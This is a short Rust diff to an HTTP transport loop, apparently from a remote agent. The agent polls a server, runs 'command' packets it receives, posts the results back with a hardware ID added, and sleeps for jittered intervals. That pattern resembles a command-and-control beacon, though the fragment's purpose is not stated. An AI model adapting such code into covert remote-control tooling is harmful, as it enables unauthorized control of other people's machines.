@@ -87,7 +87,12 @@ impl HttpTransport {
             let mut next = self.post_packet(&hb).await?;
             while let Some(pkt) = next {
                 if pkt.packet_type != "command" { break; }
-                next = self.post_packet(&dispatch.dispatch(&pkt)).await?;
+                let mut resp = dispatch.dispatch(&pkt);
+                // HTTP mode is stateless — server needs hwid in every packet
+                if let Some(obj) = resp.data.as_object_mut() {
+                    obj.insert("hwid".to_string(), serde_json::Value::String(self.hwid.clone()));
+                }
+                next = self.post_packet(&resp).await?;
             }
             sleep(Duration::from_secs_f64(self.jittered_secs())).await;
         }
